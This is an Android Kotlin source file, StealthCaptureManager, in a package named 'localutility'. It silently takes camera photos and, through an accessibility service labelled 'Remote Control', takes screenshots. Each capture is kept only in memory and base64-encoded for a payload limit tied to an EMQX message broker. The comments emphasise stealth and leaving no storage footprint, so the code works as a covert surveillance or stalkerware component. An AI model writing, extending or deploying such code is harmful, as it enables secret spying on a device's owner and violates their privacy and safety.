package com.example.localutility

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.Display
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.math.roundToInt

class StealthCaptureManager(private val context: Context) {

    private val mainHandler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG = "StealthCapture"
        // Atomic lock to prevent overlapping hardware capture requests and HAL deadlocks
        private val isBusy = AtomicBoolean(false)
        private const val CAPTURE_TIMEOUT_MS = 5000L
        private const val HARDWARE_COOLDOWN_MS = 1500L
        private const val MAX_SCREENSHOT_DIMENSION = 1280
        private const val JPEG_COMPRESSION_QUALITY = 70
    }

    /**
     * Captures a single image silently using Camera2 API entirely in RAM.
     * Does NOT save anything to phone storage or gallery.
     */
    @SuppressLint("MissingPermission")
    fun captureCamera(isFront: Boolean, onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
        if (!isBusy.compareAndSet(false, true)) {
            onComplete(null, "Camera hardware is busy. Please wait 2 seconds before capturing again.")
            return
        }

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        if (cameraManager == null) {
            isBusy.set(false)
            onComplete(null, "Camera hardware service unavailable")
            return
        }

        try {
            val targetFacing = if (isFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == targetFacing
            } ?: cameraManager.cameraIdList.firstOrNull()

            if (cameraId == null) {
                isBusy.set(false)
                onComplete(null, "No camera found on device for facing: ${if (isFront) "FRONT" else "BACK"}")
                return
            }

            // 1280x720 provides sharp resolution while keeping Base64 payload well under 250 KB (EMQX safe)
            val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
            var cameraDevice: CameraDevice? = null
            var isFinished = false

            fun finishWith(data: String?, err: String?) {
                if (isFinished) return
                isFinished = true
                try { imageReader.close() } catch (_: Exception) {}
                try { cameraDevice?.close() } catch (_: Exception) {}
                // Cooldown: release hardware lock after 1.5 seconds delay
                mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
                onComplete(data, err)
            }

            // 5-second safety timeout so camera device is never left open
            mainHandler.postDelayed({
                finishWith(null, "Camera capture timed out")
            }, CAPTURE_TIMEOUT_MS)

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val planes = image.planes
                        if (planes.isNotEmpty()) {
                            val buffer: ByteBuffer = planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                            image.close()
                            finishWith(base64, null)
                            return@setOnImageAvailableListener
                        }
                        image.close()
                    }
                    finishWith(null, "Failed to read image frame from camera buffer")
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing image frame", e)
                    finishWith(null, e.message)
                }
            }, mainHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface
                        val surfaces = listOf(surface)

                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val requestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }
                                    session.capture(requestBuilder.build(), null, mainHandler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Capture request failed", e)
                                    finishWith(null, "Capture request failed: ${e.message}")
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                finishWith(null, "Camera capture session configuration failed")
                            }
                        }, mainHandler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to create camera session", e)
                        finishWith(null, "Failed to create camera session: ${e.message}")
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    finishWith(null, "Camera device disconnected unexpectedly")
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    finishWith(null, "Camera hardware open error code: $error")
                }
            }, mainHandler)

        } catch (e: Exception) {
            isBusy.set(false)
            Log.e(TAG, "Camera capture exception", e)
            onComplete(null, "Camera exception: ${e.message}")
        }
    }

    /**
     * Captures a silent system screenshot using AccessibilityService in RAM.
     * Does NOT save anything to phone storage or gallery.
     */
    fun captureScreenshot(onComplete: (base64Jpeg: String?, error: String?) -> Unit) {
        val service = RemoteInputService.instance
        if (service == null) {
            onComplete(null, "Accessibility Service (Remote Control) must be ON to capture screenshots")
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!isBusy.compareAndSet(false, true)) {
                onComplete(null, "System capture is busy. Please wait a moment.")
                return
            }

            try {
                service.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    context.mainExecutor,
                    object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                            try {
                                val buffer = screenshotResult.hardwareBuffer
                                val colorSpace = screenshotResult.colorSpace
                                val rawBitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
                                buffer.close()

                                if (rawBitmap != null) {
                                    // Proportionally scale down if resolution exceeds MAX_SCREENSHOT_DIMENSION
                                    val width = rawBitmap.width
                                    val height = rawBitmap.height
                                    val maxDim = maxOf(width, height)
                                    val scaledBitmap = if (maxDim > MAX_SCREENSHOT_DIMENSION) {
                                        val scale = MAX_SCREENSHOT_DIMENSION.toFloat() / maxDim
                                        Bitmap.createScaledBitmap(
                                            rawBitmap,
                                            (width * scale).roundToInt(),
                                            (height * scale).roundToInt(),
                                            true
                                        )
                                    } else {
                                        rawBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                    }
                                    rawBitmap.recycle()

                                    // Compress to JPEG in memory (zero file storage footprint)
                                    val stream = ByteArrayOutputStream()
                                    scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_COMPRESSION_QUALITY, stream)
                                    scaledBitmap.recycle()

                                    val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                                    mainHandler.postDelayed({ isBusy.set(false) }, HARDWARE_COOLDOWN_MS)
                                    onComplete(base64, null)
                                } else {
                                    isBusy.set(false)
                                    onComplete(null, "Failed to decode screenshot hardware buffer into Bitmap")
                                }
                            } catch (e: Exception) {
                                isBusy.set(false)
                                Log.e(TAG, "Screenshot processing error", e)
                                onComplete(null, "Screenshot processing error: ${e.message}")
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            isBusy.set(false)
                            onComplete(null, "Screenshot capture failed with system error code: $errorCode")
                        }
                    }
                )
            } catch (e: Exception) {
                isBusy.set(false)
                Log.e(TAG, "Screenshot exception", e)
                onComplete(null, "Screenshot exception: ${e.message}")
            }
        } else {
            onComplete(null, "Background silent screenshot requires Android 11 or higher")
        }
    }
}
